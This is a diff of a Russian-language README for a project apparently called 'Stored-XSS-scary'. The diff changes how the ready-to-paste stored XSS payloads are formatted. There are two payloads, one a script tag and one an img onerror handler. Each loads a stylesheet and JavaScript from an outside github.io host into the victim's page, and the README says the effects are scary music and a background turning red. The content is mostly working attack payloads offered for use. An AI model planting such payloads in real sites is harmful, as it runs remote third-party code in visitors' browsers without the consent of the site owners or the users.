@@ -9,9 +9,9 @@ https://github.com/0-DAyFF13R/Stored-XSS-scary/assets/63510648/bb422629-d35f-476
 
 Полная версия (JS + CSS) [288 символов]:
 Через script
-> <script>var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r);</script>
+```<script>var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r);</script>```
 Через img
-> <img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)">
+```<img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)">```
 
 * Страшная музыка.
 * Постепенно изменяющийся цвет фона на красный.
